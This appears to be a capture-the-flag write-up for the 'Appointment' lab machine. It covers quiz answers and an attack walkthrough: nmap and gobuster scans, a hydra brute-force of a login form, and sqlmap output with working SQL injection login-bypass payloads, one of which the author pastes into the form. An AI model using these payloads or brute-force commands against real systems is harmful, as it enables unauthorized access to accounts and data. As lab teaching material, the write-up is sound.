# Appointment
## Q&A

We connect to the machine as usual by openvpn.

And here we got some questions to answer.

**What does the acronym SQL stand for?**
-*Structured Query Language*

**What is one of the most common type of SQL vulnerabilities?**
-*SQL injection*

**What does PII stand for?**
-*Personally Identifiable Information*

**What does the OWASP Top 10 list name the classification for this vulnerability?**
-*A03:2021-Injection*

**What service and version are running on port 80 of the target?**
-*Apache httpd 2.4.38 ((Debian))*

**What is the standard port used for the HTTPS protocol?**
-*443*

**What is one luck-based method of exploiting login pages?**
-*brute-forcing*

**What is a folder called in web-application terminology?**
-*directory*

**What response code is given for "Not Found" errors?**
-*404*

**What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?**
-_dir

**What symbol do we use to comment out parts of the code?**
-_#

## Actions

First we scan the machine at all ports

```sh
nmap -p- -Pn {Machine IP}
```

And discover an open http port 

*80/tcp open  http Apache httpd 2.4.38 ((Debian))*

If we try to enter the machine IP to browser we will find an interesting login form

### GoBuster

Let's scan with GoBuster to search for some interesting catalogs

I will use medium 2.3 wordlist to scan the machine

```sh
gobuster dir -u http://{IP} -w {wordlist} -o {output}
```

After 2-3 minutes we get this output
```
/css                  
/fonts                   
/icons/      
/images/              
/js/                  
/vendor/             
```

I've searched for anything in this directories, but nothing useful found

### Hydra 
As soon as we have a login form we can try brute-forcing it by hydra

I found "Top 500" logins and passwords wordlist, so let's try it

```sh
sudo hydra -L {login wordlist} -P {pass wordlist} {IP} http-post-form "/index.php/login:username=^USER^&password=^PASS^:Remember" -v
```

This command had to make almost 250000 tries and it was very slooow
But after almost 30000 combinations hydra "found" two log-pass bundles

```
Log - webvpn
Log - admin
```

I felt something wrong that there were two bundles with the same login, but I tried them and none of 'em gone successful, I decided to leave this idea

### SQL Injection

The tasks gave us a hint about sql injections, so let's try it!
First I manually tried simple injections such as 1=1 or ' in different ways, useless
So we have to use sql map

```sh
sqlmap -r request1 --delay 5 --risk=3 --level=5 --batch
```

It gives us the solution
```
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-4893' OR 3342=3342-- OCGH&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 9010 FROM (SELECT(SLEEP(5)))WLrB)-- OfQD&password=admin
```

I just paste the payload to login form and it redirects to the flag ;)

## **Fin**

